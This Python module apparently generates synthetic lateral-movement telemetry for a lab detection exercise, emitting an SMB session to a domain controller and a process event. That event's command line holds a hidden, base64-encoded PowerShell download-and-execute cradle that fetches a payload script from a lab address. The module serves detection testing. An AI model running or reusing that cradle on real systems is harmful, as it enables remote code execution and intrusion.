"""Persona 2: Lateral Mover.

Originates from compromised workstation lab-win10-03 (192.168.56.31),
establishes an internal SMB session to domain controller lab-dc-01 (192.168.56.10),
and executes an obfuscated base64 PowerShell process within 40 seconds.
"""

from __future__ import annotations

import time
from typing import Any


def trigger_lateral_move(
    src_host: str = "lab-win10-03",
    src_ip: str = "192.168.56.31",
    dst_host: str = "lab-dc-01",
    dst_ip: str = "192.168.56.10",
) -> list[dict[str, Any]]:
    """Generates an atomic batch of lateral movement telemetry."""
    now = time.time()
    events: list[dict[str, Any]] = [
        {
            "event_type": "smb_session_open",
            "source_host": src_host,
            "source_ip": src_ip,
            "target_host": dst_host,
            "target_ip": dst_ip,
            "port": 445,
            "share_name": "\\\\lab-dc-01\\C$",
            "status": "CONNECTED",
            "message": f"SMB session opened from {src_host} ({src_ip}) to {dst_host} ({dst_ip})",
            "timestamp": now - 35,
            "signature_tag": "lateral-smb",
        },
        {
            "event_type": "process_creation",
            "host": src_host,
            "source_ip": src_ip,
            "target_host": dst_host,
            "target_ip": dst_ip,
            "parent_process": "services.exe",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -NonI -W Hidden -enc SQBYAE0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANQA2AC4AMwAxAC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA==",
            "status": "RUNNING",
            "timestamp": now,
            "signature_tag": "lateral-smb-powershell",
        }
    ]
    return events
